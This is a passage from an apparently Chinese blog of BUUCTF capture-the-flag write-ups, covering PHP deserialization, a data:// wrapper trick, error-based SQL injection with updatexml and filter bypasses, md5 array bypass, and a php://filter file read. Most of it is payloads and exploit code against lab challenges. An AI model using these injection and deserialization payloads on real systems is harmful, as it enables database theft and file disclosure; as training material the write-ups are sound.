if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file = &quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a = new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </span><br></pre></td></tr></table></figure><p>最后在 f12 里找到 flag</p><p 7e695063-3a6a-4ebc-96d3-61e6f1fef9df>flag</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a31.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a31.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="极客大挑战-2019hardsql"><a class="markdownIt-Anchor" href="#极客大挑战-2019hardsql">#</a> [极客大挑战 2019] HardSQL</h2><p>这题过滤了 union 和空格，payload 里面不能有空格，有空格页面就会显示</p><p><code>你可别被我逮住了，臭弟弟</code></p><p>在尝试找注入点的时候发现这道题目报错会回显，猜测这题可以用报错注入</p><p>查询当前数据库</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select (database())),0x7e),1))%23</span><br></pre></td></tr></table></figure><p><code>#</code> 符号也被过滤了好像，反正我是失效了，这里用 %23 就是 url 编码的 <code>#</code></p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b01.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b02.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src alt><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b03-17062624612861.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b03-17062624612861.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="b03"></p><p>把 id、username 和 password 爆出来因为限制了所以搭配 right 函数使用吧，substr 试了一下也被过滤了</p><p>id=1，username 是 flag，贴出来的 payload 就不要 id 和 username 了，占位置还没有用的信息，直接爆 password</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((password)))from(H4rDsq1)),0x7e),1))%23</span><br></pre></td></tr></table></figure><p>![](buuctf 刷题 2 / 屏幕截图 2024-01-26 175001.png)</p><p>flag{d7470798-d6bf-4a95-83c5-c7</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b05.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>f-4a95-83c5-c74172d32982}</p><p>拼接一下</p><p d7470798-d6bf-4a95-83c5-c74172d32982>flag</p><p>这里写的时候每个函数都要用 () 围起来，不围起来就会出错。。。</p><h2 id="mrctf2020ez_bypass"><a class="markdownIt-Anchor" href="#mrctf2020ez_bypass">#</a> [MRCTF2020]Ez_bypass</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>数组绕过 id 和 gg 的比较，然后 passwd=1234567 加上任意字母就能绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url?id[]=1&amp;gg[]=2</span><br><span class="line">POST data</span><br><span class="line">passwd=1234567asd</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b06.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>就能拿到 flag</p><p efd3d59f-e165-43d1-b22a-c2793230b6e9>flag</p><h2 id="网鼎杯-2020-青龙组areuserialz"><a class="markdownIt-Anchor" href="#网鼎杯-2020-青龙组areuserialz">#</a> [网鼎杯 2020 青龙组] AreUSerialz</h2><p>参考大佬：<a href="https://blog.csdn.net/m0_46246804/article/details/108746253">https://blog.csdn.net/m0_46246804/article/details/108746253</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>is_valid()</code>  函数是对于传入的字符串进行判断，确保每一个字符 ASCII 值都在 32-125 之间，就是判断这个字符串每一个字符可不可以打印，可以打印返回 true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过 get 方式获取 str，如果 str 内容没有不可以打印的字符就进行反序列化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 op 是 === 强比较如果等于字符串 &quot;2&quot; 的话__destruct () 会将其置为 1。然后执行 process ()。在 process () 里，如果 op == &quot;2&quot; 则会执行 read () 和 output ()。</p><p>read () 里面是通过 <code>file_get_contents()</code>  方法来读取文件的</p><p>如果想读取 flag，需要绕过，防止 op 被置 1，可以传入一个数字 2 来绕过对于 op 的判断。</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看网页源代码会发现有一些不可打印字符。是因为序列化后 protected 类型的属性存在不可打印字符。（private 类型的属性序列化后也产生不可打印字符）对于 PHP 版本 7.1+，对属性的类型不敏感，可以把 protected 类型改为 public，消除不可打印字符。</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b07.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/b07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>所以 exp 变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span 